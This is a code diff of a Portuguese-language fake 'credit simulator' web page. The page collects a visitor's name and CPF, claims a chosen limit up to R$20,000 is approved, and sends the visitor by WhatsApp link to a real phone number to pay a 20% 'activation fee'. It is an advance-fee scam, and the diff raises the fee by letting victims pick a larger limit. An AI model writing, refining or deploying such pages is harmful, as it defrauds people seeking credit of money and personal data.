@@ -21,15 +21,17 @@
 
 <div class="container" id="tela-inicial">
     <h1>Simulador de Crédito</h1>
-    <p>Preencha abaixo para verificar seu limite disponível:</p>
+    <p>Preencha os dados e escolha o limite desejado:</p>
     <input type="text" id="nome" placeholder="Seu Nome">
     <input type="text" id="cpf" placeholder="Seu CPF">
+    <input type="number" id="limite-desejado" placeholder="Limite desejado (R$)" min="1" max="20000">
+    <p style="font-size: 11px; color: #888; margin-top: -5px; margin-bottom: 10px;">Limite máximo permitido: R$ 20.000,00</p>
     <button onclick="simular()">SIMULAR AGORA</button>
 </div>
 
 <div class="container" id="resultado">
     <h2>Análise Concluída!</h2>
-    <p>Olá <span id="nome-user"></span>, seu limite liberado é de:</p>
+    <p>Olá <span id="nome-user"></span>, seu limite aprovado é de:</p>
     <div id="valor-limite" style="font-size: 28px; font-weight: bold; color: var(--green); margin: 10px 0;"></div>
     <p>Para liberar, pague a taxa de ativação de 20%:</p>
     <div id="valor-taxa" style="font-size: 24px; color: var(--red); font-weight: bold; margin-bottom: 15px;"></div>
@@ -39,21 +41,40 @@
 
 <script>
     function simular() {
-        const nome = document.getElementById('nome').value;
-        if(nome === "") { alert("Preencha seu nome!"); return; }
-        
-        // Gera valor aleatório entre 50 e 200 com centavos
-        const limite = (Math.random() * (200 - 50) + 50).toFixed(2);
-        const taxa = (limite * 0.20).toFixed(2);
-        
+        const nome = document.getElementById('nome').value.trim();
+        const limiteInput = parseFloat(document.getElementById('limite-desejado').value);
+
+        if (nome === "") { 
+            alert("Por favor, preencha seu nome!"); 
+            return; 
+        }
+
+        if (isNaN(limiteInput) || limiteInput <= 0) {
+            alert("Digite um valor de limite válido!");
+            return;
+        }
+
+        if (limiteInput > 20000) {
+            alert("O limite máximo para simulação é de R$ 20.000,00!");
+            return;
+        }
+
+        // Calcula a taxa de 20% sobre o limite que o usuário digitou
+        const limite = limiteInput.toFixed(2);
+        const taxa = (limiteInput * 0.20).toFixed(2);
+
+        // Formatação de valores para moeda brasileira
+        const limiteFormatado = parseFloat(limite).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        const taxaFormatada = parseFloat(taxa).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
         document.getElementById('nome-user').innerText = nome;
-        document.getElementById('valor-limite').innerText = "R$ " + limite.replace('.', ',');
-        document.getElementById('valor-taxa').innerText = "R$ " + taxa.replace('.', ',');
-        
+        document.getElementById('valor-limite').innerText = "R$ " + limiteFormatado;
+        document.getElementById('valor-taxa').innerText = "R$ " + taxaFormatada;
+
         document.getElementById('tela-inicial').style.display = "none";
         document.getElementById('resultado').style.display = "block";
-        
-        const link = "https://wa.me/5532987194791?text=Olá Bigode! Meu nome é " + nome + ". Simulei o cartão e o limite foi R$ " + limite.replace('.', ',') + ". Quero pagar os 20% (R$ " + taxa.replace('.', ',') + ") para liberar.";
+
+        const link = "https://wa.me/5532987194791?text=Olá Bigode! Meu nome é " + encodeURIComponent(nome) + ". Simulei o cartão com limite de R$ " + limiteFormatado + ". Quero pagar os 20% (R$ " + taxaFormatada + ") para liberar.";
         document.getElementById('link-pagamento').href = link;
     }
 </script>
